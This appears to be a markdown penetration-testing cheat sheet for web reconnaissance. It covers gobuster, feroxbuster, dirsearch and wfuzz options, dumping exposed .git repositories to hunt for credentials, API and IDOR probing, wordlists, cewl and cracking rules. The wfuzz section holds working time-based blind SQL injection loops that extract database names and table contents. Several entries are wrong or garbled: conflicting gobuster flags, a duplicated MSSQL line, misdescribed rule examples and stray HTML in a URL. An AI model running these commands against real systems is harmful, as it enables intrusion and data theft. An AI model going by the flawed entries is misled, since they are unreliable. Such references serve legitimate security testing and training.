|---------------------------------|----------------------------------------------------------------|-------------------------------------------------------------|--------------------------------------------|
| **Directory Enumeration**       | ```gobuster dir -u http://example.com -w wordlist.txt```        | Performs basic directory enumeration.                        | http://example.com/admin (Status: 200) [Size: 1234] |
| **Specify File Extensions**     | ```gobuster dir -u http://example.com -w wordlist.txt -x php,html``` | Searches for files with specific extensions.                 | http://example.com/index.php (Status: 200) |
| **Custom Status Codes**         | ```gobuster dir -u http://example.com -w wordlist.txt -s 200,301``` | Filters results by HTTP status codes.                        | http://example.com/backup (Status: 301)   |
| **DNS Subdomain Enumeration**   | ```gobuster dns -d example.com -w subdomains.txt```            | Discovers subdomains via DNS enumeration.                    | Found: admin.example.com                   |
| **Virtual Host Discovery**      | ```gobuster vhost -u http://example.com -w vhosts.txt```       | Enumerates virtual hosts on the server.                      | Found: dev.example.com (Status: 200)       |
| **S3 Bucket Enumeration**       | ```gobuster s3 -w bucket-names.txt```                          | Searches for accessible S3 buckets.                          | http://example-bucket.s3.amazonaws.com (Status: 200) |
| **Add Custom Headers**          | ```gobuster dir -u http://example.com -w wordlist.txt -H "X-Custom: value"``` | Adds custom HTTP headers to requests.                         | Using custom header: X-Custom              |
| **Use Proxy**                   | ```gobuster dir -u http://example.com -w wordlist.txt --proxy http://127.0.0.1:8080``` | Routes requests through a proxy.                             | Using proxy: http://127.0.0.1:8080         |
| **Recursive Scanning**          | ```gobuster dir -u http://example.com -w wordlist.txt -r```    | Enables recursive directory scanning.                        | http://example.com/admin/users (Status: 200) |
| **Wildcard Detection**          | ```gobuster dir -u http://example.com -w wordlist.txt --wildcard``` | Detects and handles wildcard responses.                       | Wildcard response detected: disabling wildcards |
| **Follow Redirects**            | ```gobuster dir -u http://example.com -w wordlist.txt -r```    | Follows HTTP redirects automatically.                        | http://example.com/old → http://example.com/new |
| **Set Threads**                 | ```gobuster dir -u http://example.com -w wordlist.txt -t 50``` | Sets the number of concurrent threads.                       | Using 50 threads                          |
| **Set Timeout**                 | ```gobuster dir -u http://example.com -w wordlist.txt --timeout 10s``` | Sets request timeout duration.                               | Timeout set to 10 seconds                  |
| **Exclude Length**              | ```gobuster dir -u http://example.com -w wordlist.txt --exclude-length 1234``` | Excludes responses with specific length.                     | Excluding responses of length 1234        |
| **Pattern Matching**            | ```gobuster dir -u http://example.com -w wordlist.txt -p pattern.txt``` | Uses pattern file for enumeration.                           | Using pattern file: pattern.txt           |
| **No Status Codes**             | ```gobuster dir -u http://example.com -w wordlist.txt -n```    | Disables status code display.                                | http://example.com/admin                  |
| **No Progress Bar**             | ```gobuster dir -u http://example.com -w wordlist.txt -q```    | Disables progress bar output.                                | http://example.com/admin (Status: 200)    |
| **Verbose Output**              | ```gobuster dir -u http://example.com -w wordlist.txt -v```    | Enables verbose output mode.                                 | [+] Mode: dir<br>[+] Url: http://example.com |
| **Output to File**              | ```gobuster dir -u http://example.com -w wordlist.txt -o output.txt``` | Saves results to a file.                                     | Results saved to output.txt               |
| **Username Enumeration**        | ```gobuster dir -u http://example.com -w wordlist.txt -U username -P password``` | Provides credentials for authentication.                     | Using basic authentication: username      |
| **User-Agent String**           | ```gobuster dir -u http://example.com -w wordlist.txt -a "Mozilla/5.0"``` | Sets custom User-Agent header.                                | Using User-Agent: Mozilla/5.0             |
| **Cookies**                     | ```gobuster dir -u http://example.com -w wordlist.txt -c "session=abc123"``` | Adds cookies to requests.                                     | Using cookies: session=abc123            |
| **No TLS Verification**         | ```gobuster dir -u https://example.com -w wordlist.txt -k```  | Skips TLS certificate verification.                           | Skipping TLS verification                 |
| **DNS Resolver**                | ```gobuster dns -d example.com -w wordlist.txt -r 8.8.8.8```  | Uses custom DNS resolver.                                     | Using DNS resolver: 8.8.8.8               |
| **Show IPs**                     | ```gobuster dns -d example.com -w wordlist.txt -i```         | Displays IP addresses in DNS mode.                            | admin.example.com [192.168.1.1]          |
| **Show CNAMEs**                 | ```gobuster dns -d example.com -w wordlist.txt --show-cname``` | Displays CNAME records in DNS mode.                           | www.example.com → cdn.example.com        |

### Examples

- ### Filter to show only 200 responses
> ```bash
> gobuster dir -u http://<IP-ADDRESS> -w /path/to/wordlist.txt -s 200
> ```
- ### Specify extensions
> ```bash
> gobuster dir -u http://<IP-ADDRESS> -w /path/to/wordlist.txt -x php,html,txt
> ```
- ### Save output to a file
> ```bash
> gobuster dir -u http://<IP-ADDRESS> -w /path/to/wordlist.txt -o results.txt
> ```
- ### Set number of threads
> ```bash
> gobuster dir -u http://<IP-ADDRESS> -w /path/to/wordlist.txt -t 50
> ```
- ### Use proxy
> ```bash
> gobuster dir -u http://<IP-ADDRESS> -w /path/to/wordlist.txt -p http://127.0.0.1:8080
> ```
- ### Enumerate DNS: gather information about key servers within the domain
> ```bash
> gobuster dns -d domain.com -t 25 -w /us/share/wordlists/Seclist/Discovery/DNS/subdomain-top2000.txt
> ```

## Feroxbuster

| Command                             | Example Usage                                                                                   | Function                                                | Output Example                           |
|-------------------------------------|-------------------------------------------------------------------------------------------------|--------------------------------------------------------|------------------------------------------|
| **Basic Usage**                     | ```feroxbuster -u http://<IP Address>```                                                          | Performs directory brute-forcing                        | N/A                                      |
| **Silent Mode**                     | ```feroxbuster -u http://<IP Address> --silent```                                                  | Reduces output verbosity                               | N/A                                      |
| **Redirects**                        | ```feroxbuster -u http://<IP Address> -r```                                                      | Follows HTTP redirections                               | Redirects followed to http://<IP Address>/newpath |
| **File Extensions**                 | ```feroxbuster -u http://<IP Address> -x php,txt --silent```                                     | Fuzzes for specific file extensions                     | N/A                                      |
| **Result Output**                   | ```feroxbuster -u http://<IP Address> --output results.txt```                                     | Logs results to a file                                  | Results saved to results.txt             |
| **User-Agent**                      | ```feroxbuster -u http://<IP Address> -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"```            | Customizes the user-agent header                        | Using User-Agent: Mozilla/5.0           |
| **Filter Status Code**              | ```feroxbuster -u http://<IP Address> -C 403,404```                                              | Filters out specific status codes                        | Excluding 403, 404 status codes          |
| **Quiet Mode**                      | ```feroxbuster -u http://<IP Address> -q```                                                      | Suppresses progress bar and banner                      | Quiet mode enabled                       |
| **Controlling Threads**             | ```feroxbuster -u http://<IP Address> -t 20```                                                   | Limits concurrent threads                               | Using 20 threads                        |
| **Custom Wordlist**                 | ```feroxbuster -u http://<IP Address> -w /usr/share/wordlists/dirb/common.txt```                  | Uses a custom wordlist                                  | N/A                                      |
| **Disable Recursion**               | ```feroxbuster -u http://<IP Address> -n```                                                      | Disables recursive scanning                             | N/A                                      |
| **Limit Recursion Depth**           | ```feroxbuster -u http://<IP Address> -L 4```                                                    | Limits recursion depth                                  | Recursion depth set to 4                 |
| **Force Recursion**                 | ```feroxbuster -u http://<IP Address> --force-recursion```                                       | Forces recursion                                        | Recursion forced                         |
| **Filter by Character Size**        | ```feroxbuster -u http://<IP Address> -q -S 285,286,283,289```                                   | Filters by response size                                | Filtering response sizes: 285, 286, 283, 289 |
| **Filter by Number of Words**       | ```feroxbuster -u http://<IP Address> -q -W 33```                                                | Filters by number of words                              | Filtering results with 33 words          |
| **Filter by Number of Lines**       | ```feroxbuster -u http://<IP Address> -q -N 9```                                                 | Filters by number of lines                              | Filtering results with 9 lines           |
| **Filter Status Code (Deny List)**  | ```feroxbuster -u http://<IP Address> -q --filter-status 404```                                   | Deny list for status codes                              | Filtering out status code 404            |
| **Filter Status Code (Allow List)** | ```feroxbuster -u http://<IP Address> -q --status-codes 200,301```                                | Allow list for status codes                             | Allowing status codes 200, 301          |
| **Generate Random User-Agent**      | ```feroxbuster -u http://<IP Address> -A --burp```                                               | Uses random User-Agent for each request                 | Random User-Agent used                   |
| **HTTP Method**                     | ```feroxbuster -u http://<IP Address> -m POST```                                                 | Specifies the HTTP method to use                        | Using POST method                       |
| **Custom Headers**                  | ```feroxbuster -u http://<IP Address> -H 'Content-Type: application/x-www-form-urlencoded' --burp -q``` | Adds custom headers                                     | Using header Content-Type: application/x-www-form-urlencoded |
| **Cookies**                         | ```feroxbuster -u http://<IP Address> --cookies PHPSESSID=t54ij15l5d51i2tc7j1k1tu4p4 --burp -q```  | Sets cookies for the requests                           | Using cookies: PHPSESSID=t54ij15l5d51i2tc7j1k1tu4p4 |
| **Add Slash**                       | ```feroxbuster -u http://<IP Address> -f```                                                      | Appends a slash to each request                         | Adding slash to requests                 |
| **Capture Requests in Burp**        | ```feroxbuster -u http://<IP Address> --burp```                                                  | Captures requests for Burp Suite                        | Requests captured in Burp Suite          |
| **Read Target from List**           | ```cat target.txt | feroxbuster --stdin -q```                                                   | Reads target URLs from a list                            | N/A                                      |
| **Resume from Last State**          | ```feroxbuster --resume-from ferox-http_<IP Address>-1723370176.state -q```                       | Resumes scan from last saved state                       | Resuming from previous state            |
| **Follow Redirect**                 | ```feroxbuster -u http://<IP Address> -r```                                                      | Follows redirects during scanning                        | Following redirects                      |
| **Timeout**                         | ```feroxbuster -u http://<IP Address> -T 5```                                                    | Sets the timeout duration to 5 seconds                   | Timeout set to 5 seconds                 |

## Dirsearch

- ### Basic Directory scanning
> ```bash
> dirsearch -u http://<IP-ADDRESS> -w /path/to/wordlist.txt
> ```
- ### Filter to show only 200 or 3xx responses
> ```bash
> dirsearch -u http://<IP-ADDRESS> -w /path/to/wordlist.txt -i 200,300-399
> ```
- ### Specify extensions
> ```bash
> dirsearch -u http://<IP-ADDRESS> -w /path/to/wordlist.txt -e php,html,txt
> ```
- ### Save Output to a file
> ```bash
> dirsearch -u http://<IP-ADDRESS> -w /path/to/wordlist.txt -r -o results.txt
> ```
- ### Set number of threads
> ```bash
> dirsearch -u http://<IP-ADDRESS> -w /path/to/wordlist.txt -t 50
> ```
- ### Use proxy
> ```bash
> dirsearch -u http://<IP-ADDRESS> -w /path/to/wordlist.txt -x http://127.0.0.1:8080
> ```
- ### Ignore SSL certification warnings
> ```bash
> dirsearch -u http://<IP-ADDRESS> -w /path/to/wordlist.txt -k
> ```
- ### Exclude specific status codes
> ```bash
> dirsearch -u http://<IP-ADDRESS> -w /path/to/wordlist.txt --exclude-status 404,403
> ```

## WFUZZ

| Command                          | Example Usage                                                                                           | Function                              | Output Example                                              |
|----------------------------------|---------------------------------------------------------------------------------------------------------|--------------------------------------|-------------------------------------------------------------|
| **Basic Fuzzing**                | `wfuzz -w wordlist.txt http://example.com/FUZZ`                                                          | Fuzzes directories                   | `000000001: 200 1234 L 45 W 12345 Ch "admin"`                |
| **Multiple Fuzz Points**         | `wfuzz -w list1.txt -w list2.txt http://example.com/FUZZ/FUZ2Z`                                          | Fuzzes two positions                 | `000000001: 200 50 L 20 W 5000 Ch "api" - "v1"`              |
| **POST Fuzzing**                 | `wfuzz -w wordlist.txt -d "user=admin&pass=FUZZ" http://example.com/login`                               | Fuzzes POST data                     | `000000001: 200 10 L 5 W 150 Ch "password123"`               |
| **Header Fuzzing**               | `wfuzz -w agents.txt -H "User-Agent: FUZZ" http://example.com/`                                          | Fuzzes User-Agent                    | `000000001: 200 100 L 50 W 10000 Ch "Mozilla/5.0..."`        |
| **Cookie Fuzzing**               | `wfuzz -w wordlist.txt -b "session=FUZZ" http://example.com/`                                            | Fuzzes cookie values                 | `000000001: 302 5 L 2 W 45 Ch "abc123def456"`                |
| **VHost Discovery**              | `wfuzz -w subdomains.txt -H "Host: FUZZ.example.com" http://192.168.1.10/`                              | Discovers virtual hosts              | `000000001: 200 200 L 100 W 20000 Ch "admin"`                |
| **Filter Status Code**           | `wfuzz -w wordlist.txt --sc 200 http://example.com/FUZZ`                                                 | Shows only 200 OK                    | `000000001: 200 50 L 25 W 5000 Ch "dashboard"`               |
| **Hide Status Code**             | `wfuzz -w wordlist.txt --hc 404 http://example.com/FUZZ`                                                | Hides 404 errors                     | `000000001: 200 30 L 15 W 3000 Ch "api"`                     |
| **Filter Length**                | `wfuzz -w wordlist.txt --sl 1000 http://example.com/FUZZ`                                               | Shows 1000-char responses            | `000000001: 200 50 L 25 W 1000 Ch "config"`                  |
| **Hide Length**                  | `wfuzz -w wordlist.txt --hl 4242 http://example.com/FUZZ`                                              | Hides 4242-byte responses            | `000000001: 200 100 L 50 W 10000 Ch "upload"`                |
| **Word Count Filter**            | `wfuzz -w wordlist.txt --sw 100 http://example.com/FUZZ`                                                | Shows 100-word responses             | `000000001: 200 20 L 100 W 2000 Ch "about"`                  |
| **Regex Filter**                 | `wfuzz -w wordlist.txt --ss "admin" http://example.com/FUZZ`                                           | Shows "admin" in response            | `000000001: 200 50 L 25 W 5000 Ch "panel"`                   |
| **Basic Auth**                   | `wfuzz -w passwords.txt --basic admin:FUZZ http://example.com/`                                          | Tests basic auth                     | `000000001: 200 10 L 5 W 500 Ch "P@ssw0rd"`                  |
| **Custom Method**                | `wfuzz -w wordlist.txt -X PUT http://example.com/FUZZ`                                                  | Uses PUT method                      | `000000001: 200 5 L 2 W 100 Ch "config"`                     |
| **Proxy Usage**                  | `wfuzz -w wordlist.txt -p 127.0.0.1:8080 http://example.com/FUZZ`                                      | Routes through proxy                 | `000000001: 200 50 L 25 W 5000 Ch "admin"`                   |
| **Request Delay**                | `wfuzz -w wordlist.txt -s 2 http://example.com/FUZZ`                                                   | 2-second delay                       | `000000001: 200 50 L 25 W 5000 Ch "api"`                     |
| **Recursion**                    | `wfuzz -w wordlist.txt -R 2 http://example.com/FUZZ`                                                   | Recursive fuzzing                    | `000000001: 200 50 L 25 W 5000 Ch "admin"`                   |
| **Follow Redirects**             | `wfuzz -w wordlist.txt --follow http://example.com/FUZZ`                                               | Follows redirects                    | `000000001: 200 50 L 25 W 5000 Ch "login" --> "/dashboard"`   |
| **Thread Count**                 | `wfuzz -w wordlist.txt -t 50 http://example.com/FUZZ`                                                  | Uses 50 threads                      | `000000001: 200 50 L 25 W 5000 Ch "admin"`                   |
| **Output to File**               | `wfuzz -w wordlist.txt -f results.txt http://example.com/FUZZ`                                         | Saves to file                        | `Results saved to results.txt`                                |
| **JSON Output**                  | `wfuzz -w wordlist.txt -o json http://example.com/FUZZ`                                                | Outputs JSON                         | `{"url":"http://example.com/admin","code":200,"lines":50}`    |
| **Lines Filter**                 | `wfuzz -w wordlist.txt --sl 50 http://example.com/FUZZ`                                                | Shows 50-line responses              | `000000001: 200 50 L 25 W 5000 Ch "config"`                   |
| **Hide Lines**                   | `wfuzz -w wordlist.txt --hl 15 http://example.com/FUZZ`                                                | Hides 15-line responses              | `000000001: 200 50 L 25 W 5000 Ch "dashboard"`                |
| **Combined Filters**             | `wfuzz -w wordlist.txt --sc 200 --hl 4242 http://example.com/FUZZ`                                     | Multiple filters                      | `000000001: 200 50 L 25 W 5000 Ch "admin"`                    |

### Examples

| Command | Example Usage | Function | Output Example |
| ------- | ------------- | -------- | -------------- |
| Find available directories | ```bash wfuzz --hc 404 -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://<IP-ADDRESS>/FUZZ ``` | Fuzzes directories | |
| Find available directories with cookies | ```bash wfuzz --hc 404 -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -H "cookie: <cookie_name>=<cookie_value>" http://<IP-ADDRESS>/FUZZ ``` | Fuzzes directories with cookies | |
| Fuzz data parameters | ```bash wfuzz --hc 404 -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -d "id=FUZZ&catalogue=1" http://<IP-ADDRESS> ``` | Fuzzes data parameters | |
| Subdomain enumeration | ```bash wfuzz --hc 404 -c -w /usr/share/amass/wordlists/subdomains-top1mil-110000.txt -H "HOST: FUZZ.<TARGET_DOMAIN>" <TARGET_DOMAIN> ``` | Discovers subdomains | |
| Enumerate hidden directories | ```bash wfuzz --hc 404 -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://<IP-ADDRESS>/.FUZZ ``` | Enumerates hidden directories | |
| Skip SSL Certificate validation | ```bash wfuzz --hc 404 -c -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://<IP-ADDRESS>/FUZZ ``` | Skips SSL validation | |
| Use threads to speed up | ```bash wfuzz --hc 404 -c -t <number of threads> -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://<IP-ADDRESS>/FUZZ ``` | Uses threads to speed up | |
| To find number of columns (MySQL) | ```bash wfuzz -c -z range,1-10 "http://website.com/index.php?id=1 ORDER BY FUZZ" ``` | Finds number of columns in MySQL | |
| To find number of columns (MSSQL) | ```bash wfuzz -c -z range,1-10 "http://website.com/index.php?id=1 ORDER BY FUZZ" ``` | Finds number of columns in MSSQL | |
| Determine Database Name with wfuzz | ```bash for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 "http://<host>/index.php?id=1' AND IF(ASCII(SUBSTR(DATABASE(), $i, 1))=FUZZ, SLEEP(10), NULL) --+"; done > <filename.txt> && grep "0m9" <filename.txt ``` | Determines database name via ASCII | |
| Determine Table Name with wfuzz | ```bash for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 "http://<IP-ADDRESS>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1), $i, 1))=FUZZ, SLEEP(10), NULL) --+"; done > <filename.txt> && grep "0m9" <filename.txt ``` | Determines table name via ASCII | |
| Determine Column Name with wfuzz | ```bash for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 "http://<IP-ADDRESS>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT column_name FROM information_schema.columns WHERE table_name='<TABLE_NAME>' LIMIT 0,1), $i, 1))=FUZZ, SLEEP(10), NULL) --+"; done > <filename.txt> && grep "0m9" <filename.txt ``` | Determines column name via ASCII | |
| Extract Column Content with wfuzz | ```bash for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 "http://<IP-ADDRESS>/index.php?id=1' AND IF(ASCII(SUBSTR((SELECT <column_name> FROM <table_name> LIMIT FUZZ,1), $i, 1))=FUZZ, SLEEP(10), NULL) --+"; done > <filename.txt> && grep "0m9" <filename.txt ``` | Extracts column content via ASCII | |

## Exposed .git

> 1. Clone [Git-Dumper](https://github.com/arthaud/git-dumper</a></body></html>)
> ```bash
> git clone https://github.com/arthaud/git-dumper</a></body></html>
> ```
> 2. Dump Content of an exposed .git directory
> ```bash
> git-dumper http://<IP-ADDRESS>/.git website_git
> ```
> 3. Search for common secrets
> ```bash
> grep -r ‘password’ .
>  grep -r ‘apikey’ .
> ```
> 4. View a specific file that may contain credentials or sensitive data
> ```bash
> cat website_git/config/database.php
> ```
> 5. Check the commit log
> ```bash
> git log
> ```
> 6. Check commit diff
> ```bash
> git show [commitID]
> ```
> 7. Show Git commits and reveal information
> ```bash
> sudo git show
> ```
> 8. Althernatively: Download the .git directory if exposed and move into the directory locally
> ```bash
> sudo wget -r http://<IP-ADDRESS/.git/
> ```

## Api

- ### Basic enumeration
> ```bash
> curl http://<IP-ADDRESS>/api
> ```
- ### Common API Pattern
> ```text
> /api_name/v1
> ```
- ### Use directory exploration techniques to further enumerate endpoints
> ```bash
> curl -x GET “http://[IP-ADDRESS]:[PORT]/search?query=*”
> ["query":"*","result:""}
> ```
> - Can change * to any type of query desired
- ### Use -d for data and -H for headers
> ```bash
> curl -d ‘{"password":"fake","username":"admin"}’ -H ‘Content-Type: application/json’ http://[IP-ADDRESS]:[PORT]/users/v1/login
> ```
- ### To use a proxy
> ```bash
> --proxy 127.0.0.1:8080
> ```

## IDOR

### Understanding IDOR (Insecure Direct Object Reference)

### What is IDOR?

In the context of web security, **IDOR** occurs when an attacker can directly access an object (such as a file or database entry) by manipulating a URL or HTTP request parameter, without proper access control checks. 

#### Example:

If a user uploads a file and gets a download link like: 

download.php?file_id=123

The file ID (`file_id=123`) directly references the file on the server. But what happens if the user tries to access a different file by modifying the `file_id` parameter in the URL?

download.php?file_id=124

If the server allows access to this file (`file_id=124`) without proper authorization checks, it indicates a **broken access control** vulnerability.

To identify IDOR vulnerabilities, it’s important to look for **URL parameters** or **APIs** that reference an object, such as:

- **URL Parameters**: `?uid=1` or `?filename=file_1.pdf`
- **Other HTTP Headers**: Sometimes, object references may appear in cookies.

When testing for IDOR, consider the following:

1. **Observe URLs and Parameters**: Check if any URL or request includes unique identifiers (UIDs) or file references that could be manipulated.
   
2. **Enumerate the Possible Values**: If the object reference (such as a file ID or user ID) follows a sequential pattern, we can **enumerate** values to access objects that don’t belong to us.

---

## Wordlists

**Some Useful Generators**

| Tool                           | GitHub URL                                                          |
|--------------------------------|---------------------------------------------------------------------|
| bopscrk                        | [https://github.com/R3nt0n/bopscrk](https://github.com/R3nt0n/bopscrk) |
| COOK                            | [https://github.com/giteshnxtlvl/cook](https://github.com/giteshnxtlvl/cook) |
| CUPP                            | [https://github.com/Mebus/cupp](https://github.com/Mebus/cupp)       |
| Kerberos Username Enumeration  | [https://github.com/attackdebris/kerberos_enum_userlists](https://github.com/attackdebris/kerberos_enum_userlists) |
| Username Anarchy               | [https://github.com/urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy) |

**Useful Wordlists**

- `/usr/share/wordlists/seclists/Discovery/DNS/combined_subdomains.txt`
- `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
- `/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt`
- `/usr/share/seclists/Discovery/Web-Content/common.txt`
- `/usr/share/seclists/Discovery/Web-Content/big.txt`
- `/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt`
- `/usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt`
- `/usr/share/wordlists/wfuzz/general/big.txt`

## Cewl

- To spider a site and write all found words to a file
> ```bash
> cewl -w <file> <url>
> ```

- To spider a site and follow links to other sites
> ```bash
> cewl -o <url>
> ```

- To spider a site using a given user-agent 
> ```bash
> cewl -u <user-agent> <url>
> ```

- To spider a site for a given depth and minimum word length
> ```bash
> cewl -d <depth> -m <min word length> <url>
> ```

- To spider a site and include a count for each word
> ```bash
> cewl -c <url>
> ```

- To spider a site inluding meta data and separate the meta_data words
> ```bash
> cewl -a -meta_file <file> <url>
> ```

- To spider a site and store email adresses in a separate file
> ```bash
> cewl -e -email_file <file> <url>
> ```

## Rules

Common Rule Examples:

$1: Appends "1" to the end of the word.

Example: "password" → "password1"

^: Prepends "1" to the word.

Example: "password" → "1password"

c: Capitalizes the first character of the word.

Example: "password" → "Password"

r: Reverses the word.

Example: "password" → "drowssap"

l: Converts the word to lowercase (if it’s not already).

Example: "PASSWORD" → "password"

^c: Capitalize the first letter and append "123".

Example: "admin" → "Admin123"

**Common Rules to use**

- best66.rule
- dive.rule
- toggles5.rule
- [OneRuleToRuleThemAll](https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule)

---

## XSS

